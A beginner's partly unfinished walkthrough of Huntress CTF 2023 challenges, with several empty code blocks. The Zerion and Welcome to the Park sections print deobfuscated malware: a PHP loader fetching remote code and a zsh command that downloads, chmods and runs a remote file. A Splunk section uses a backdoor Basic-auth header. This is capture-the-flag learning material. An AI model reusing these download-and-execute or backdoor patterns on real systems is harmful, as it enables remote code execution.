This was my first CTF challenge and even more my first write up.
Some of it are just random notes written down while doing the challenges and aren't anywhere near completion others are full writeups so it's possible to understand which step are required to solve the challenges. I've learned a lot about CTF and also about writing documentation so it is possible for others to understand what I've done. 

# Huntress CTF Oktober 2023
## Book by its cover:
"They say you aren't supposed to judge a book by its cover, but this is one of my favorites!"

Files: book.rar

When you download the file it seems like its a rar archive, but if you use `file book.rar`

It will respond with:

`book.rar: PNG image data, 800 x 200, 8-bit/color RGB, non-interlaced`

You then want to convert the file to a png file, to do that you have to do the following:

`mv book.rar book.png`

Afterwards you can open the picture in the GUI and view the flag

## Notepad:
"Just a sanity check... you do know how to use a computer, right?"

Files: notepad

To begin with we download the file and file it to view what kind of file we have our hands on.

`notepad: Unicode text, UTF-8 text`

Afterwards its a simple `cat notepad` to reveal:

## String Cheese:

"Oh, a cheese stick! This was my favorite snack as a kid. My mom always called it by a different name though... "

First I started by downloading the file and check it contents. 

Flag found in the hex value of the picutre

## Query Code
"What's this?"

When you download the file it is name "query_code" and the first step is to find out what kind of file it is.
To do that we enter `file query_code` and the terminal responds with `query_code: PNG image data, 111 x 111, 1-bit colormap, non-interlaced` so this file is a png image file we then have to rename the file to a *.png* file. We do that by `mv query_code query_code.png`
We can now open the file and it reveals a QR code. Scan it with a phone and fetch the flag.

## HumanTwo
"During the MOVEit Transfer exploitation, there were tons of "indicators of compromise" hashes available for the¬†`human2.aspx`¬†webshell! We collected a lot of them, but they all look very similar... except for very minor differences. Can you find an oddity?"

## BaseFFFF+1
"Maybe you already know about base64, but what if we took it up a notch?"

To solve this challenge we first analyse what kind of file it is with the `file` command.
We see it's a unicode text `baseffff1: Unicode text, UTF-8 text, with no line terminators` so lets see what's inside the file, we do that by using the cat command
`cat baseffff1` and we get a string that have some very wierd characters in it.
```
ÈπéÈ©£îî†ìÅØÂô´Ë∞†Âï•Èπ≠ÈµßÂï¥Èô®È©∂íÑ†Èô¨È©πÂï§Èπ∑Èµ¥ìà†íÅØÍî†êô°ÂïπÈô¢È©≥Âï≥È©®È©≤ÊåÆÂîÆñ†∞Á≠ÜÁ≠ÜÈ∏†Âï≥Ê®∂Ê†µÊÑµÊ¨†Ê®µÊ®≥Êò´È∏†Âï≥Ê®∂Ê†µÂò∂Ë∞†Íç•Âï¨êô°îïπñ•°Âî¨È©®È©≤È∏†Âï≥íÅπìÅµÈ¨†Èô¨ÊΩß„∏ç„∏çÍç¶È±°Ê±ªÊ¨±Èù°È©£Ê¥∏È¨∞Ê∏∞Ê±¢È•£Ê±£Ê†πÈ®∏È•§Êù¶Ê†∑Ê§∂†å∏
```

If you take the hexidecimal value of *FFFF* of the file name and decode it you get the number 65.535, and when you take the name of the file into account you can deduct that it might got something to do with 65.535+1.
If you go Cyberchef you will see that it has an option to decode *base65536* 
if you enter the string it will reveal the flag.

## Traffic
"We saw some communication to a sketchy site... here's an export of the network traffic. Can you track it down?¬†  
  
Some tools like¬†[`rita`](https://github.com/activecm/rita)¬†or¬†[`zeek`](https://github.com/zeek/zeek)¬†might help dig through all of this data!"

I started by unzipping the file by using `gunzip *.gz`
It was mentioned in the description that there might be something about a sketchy site. So I started by something for something name *sketchy*
To do this I used the `grep` command to search for any mentioning of this in the log files.

`grep -E sketchy *.log`

The command reveals there are plenty of log intries about 
```
ssl.03:00:00-03:53:19.log:1631072773.151055     CCczHL2a9zDFsSWjGd      10.24.0.2 61758    185.199.108.153 443     TLSv12  TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256   - sketchysite.github.io    T       -       -       T       CsiI    -       -       - -`
```
So lets check the site out! When you get to the site you are presented with the flag.

## Zerion
"We observed some odd network traffic, and found this file on our web server... can you find the strange domains that our systems are reaching out to?"

This is the first challenge that involves obfuscation of code, which means that the code itself is encoded so it's hard for the human eye to understand what it does.

We start by extracting the contents of `test.gz` and we afterwards `file` the output.

We can see its a php script that does something.

`zerion: PHP script, ASCII text, with very long lines (14780), with no line terminators`

So lets start by opening the file in a text editor, my go to is Sublime Text.

In the beginning of the code we can see a specific function following, what seems to be base64 obfuscated code.

`base64_decode(strrev(str_rot13($L66Rgr[1]))))`

By this line we can see that the code is first obfuscated using `str_rot13` after that it the code is reversed by using `strrev` and finally it is encoded using base64.

So to decode the code easy we can go to Cyberchef and insert the obfuscated code. We can take the base64 encoded string and set Cyberchef to first ROT13, then reverse the string and finally base64 decode the string.

When it have baked the code, we take the output and save it into a new text file.

Next step is to find the url where the flag is hiding. We do that by using the following command `cat output.txt | grep http` from the output the flag is revealed:

```bash
if (isset($_REQUEST['ac']) && isset($_REQUEST['path']) && isset($_REQUEST['api']) && isset($_REQUEST['t'])) { $code = GC('https://c.-wic5-.com/'); if(!$code){$code = GC('https://c.-oiv3-.com/?flag=flag{af10370d485952897d5183aa09e19883}

```

## Where am i?

In this challenge we get a image file and somewhere in the image a flag is hidding. I used the `exiftool` to look what kind of data that is associated witht he file. The exif data in an image contains all sorts of data that have something to do with the image.

`exiftool PXL_20230922_231845140_2.jpg`

That command return:

When you look at the image description, you can see that there are a base64 encoded string. Lets copy paste that string in to a text file to decode it.

`echo ZmxhZ3tiMTFhM2YwZWY0YmMxNzBiYTk0MDljMDc3MzU1YmJhMik= > description.b64`

Now lets decode the string in the description.b64

We do that by using the base64 tool.

`base64 -d description.b64`

The `-d` paramter will tell the tool that the following file should be decoded and outputted in the terminal

```
base64 -d description.b64         
flag{b11a3f0ef4bc170ba9409c077355bba2)

## Welcome to the Park
"The creator of Jurassic Park is in hiding... amongst Mach-O files, apparently. Can you find him?"

First we unzip the file and start to look around, to see what we have our hands on. I ended up in the folder `welcome/Chrome.app/Contents/Resources` and found the file `interesting_thing.command`

As the filename suggest, we should check this file out.

`cat interesting_thing.command` which output:
```
#!/bin/bash
# ls -a is your friend
echo "welcome to the park"
```

This hints that there might be something hidden somewhere in the folder. The `ls -a` command list everything there are in the folder and the parameter `-a` also shows hidden files.

So lets start over in the base folder and start searching for hidden folders.

`ls -a` revealed and *.hidden* folder

In that folder I found:

`welcomeToThePark: Mach-O 64-bit arm64 executable, flags:<NOUNDEFS|DYLDLINK|TWOLEVEL|PIE>`

Next up I used `strings welcomeToThePark` and found something that looked like base64 encoded data.
I copied the data and saved into a *base64.txt* and then ran `base64 -d base64.txt`

navigate to:
`/welcometothepark/welcome/.hidden`
`strings welcomeToThePark`

The output from that command is:

```bash

```
So lets decode from the string by saving it into a `base64.txt` file and decode it and save the output into a new file.

`base64 -d base64.txt > output.txt`

We then open the output.txt file in Sublime Text to see what what we have our hands on.

```bash

```

This code is clearly obfuscated so it's hard for a human to read what it does. You could deobfuscate it by hand, by removing all the variables as in `A0be` etc. I found it way easier and a lot faster by using ChatGPT and let it do the hard work for me. When prompted to deobscate the code it came with the following output:

```
/bin/zsh -c 'tmp="$(mktemp /tmp/XXXXXX)";
curl --retry 5 -f "https://gist.github.com/stuartjash/a7d187c44f4327739b752d037be45f01" -o "${tmp}";
if [[ -s "${tmp}" ]]; then
  chmod 777 "${tmp}";
  "${tmp}";
  rm "${tmp}";
fi'
```

Go to github and download the image

First I started by looking at the exifdata, but there didn't reveal anything interresting. Next up I looked at the strings of the jpeg to see.

I used the tool `xxd` to look through the data:

`xxd JohnHammond.jpg`

That revealed the flag:
```

"You've probably seen Splunk being used for good, but have you seen it used for evil?"

The challenge start by spinning up the container, when you access the link you get an error "error	"Missing or invalid Authorization header"" from the site.

I went decompress the challenge files and went with a `grep -r Authorization`

I found some interesting files with the grep command

```bash

```
I then ran the curl command:

`curl -H "Authorization: Basic YmFja2Rvb3I6dXNlX3RoaXNfdG9fYXV0aGVudGljYXRlX3dpdGhfdGhlX2RlcGxveWVkX2h0dHBfc2VydmVyCg==" -X GET chal.ctf.games:32642`

and the response was:

## Discord Snowflake Scramble
"Someone sent¬†[message on a Discord server](https://discord.com/channels/1156647699362361364/1156648139516817519/1156648284237074552)¬†which contains a flag! They did mention something about being able to embed a list of online users on their own website...¬†  
  
Can you figure out how to join that Discord server and see the message?"


We get this link *https://discord.com/channels/1156647699362361364/1156648139516817519/1156648284237074552* and we need to join the discord server. You cant join it just using the link, so we have to use another way in.
Its hinted in the in the description there are something about snowflakes.

Discord states: "A Snowflake is a unique ID for a resource which contains a timestamp."

You can use a discordlookup service and generate a instant invite link

`https://discordlookup.com/guild/1156647699362361364`

That will take the unique snowflake ID and look it up for you.

After you join the channel it is possible for you get retrieve the flag from the post in the top.
